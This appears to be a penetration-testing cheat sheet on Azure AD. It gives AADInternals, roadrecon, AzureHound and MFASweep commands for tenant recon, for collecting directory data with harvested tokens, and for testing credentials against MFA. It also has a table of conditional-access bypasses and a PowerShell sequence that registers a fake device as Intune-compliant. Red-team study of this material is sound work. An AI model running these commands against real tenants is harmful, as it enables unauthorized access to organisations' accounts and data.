# Azure AD Enumerate

## OSINT AAD - Recon Domains

Extract openly available information for the given tenant: [aadinternals.com/osint](https://aadinternals.com/osint/)

```ps1
Invoke-AADIntReconAsOutsider -Domain "company.com" | Format-Table
Invoke-AADIntReconAsOutsider -UserName "user@company.com" | Format-Table
```

## Azure AD - Collectors

* roadrecon
    ```ps1
    roadrecon auth --access-token eyJ0eXA...
    roadrecon auth --prt-cookie <primary-refresh-token> -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2"
    roadrecon gather
    ```
* AzureHound
    ```ps1
    ./azurehound --refresh-token <refresh-token> list --tenant "<target-tenant-id>" -o output.json
    ```


## Azure AD - Conditional Access Policy

Conditional Access is used to restrict access to resources to compliant devices only.

* Enumerate Conditional Access Policies: `roadrecon plugin policies` (query the local database)

| CAP                       | Bypass  |
|---------------------------|---------|
| Location / IP ranges      | Corporate VPN, Guest Wifi |
| Platform requirement      | User-Agent switcher (Android, PS4, Linux, ...) |
| Protocol requirement      | Use another protocol (e.g for e-mail acccess:  POP, IMAP, SMTP) |
| Azure AD Joined Device    | Try to join a VM (Work Access)|
| Compliant Device (Intune) | Fake device compliance |
| Device requirement        | / |
| MFA                       | / |
| Legacy Protocols          | / |
| Domain Joined             | / |


Bypassing conditional access by faking device compliance

```powershell
# AAD Internals - Making your device compliant
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache
# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
# Marking device compliant - option 1: Registering device to Intune
# Get an access token for Intune MDM and save to cache (prompts for credentials)
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
# Join the device to Intune
Join-AADIntDeviceToIntune -DeviceName "SixByFour"
# Start the call back
Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
```

## Azure AD - MFA

* [dafthack/MFASweep](https://github.com/dafthack/MFASweep) - A tool for checking if MFA is enabled on multiple Microsoft Services
```ps1
Import-Module .\MFASweep.ps1
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS
```

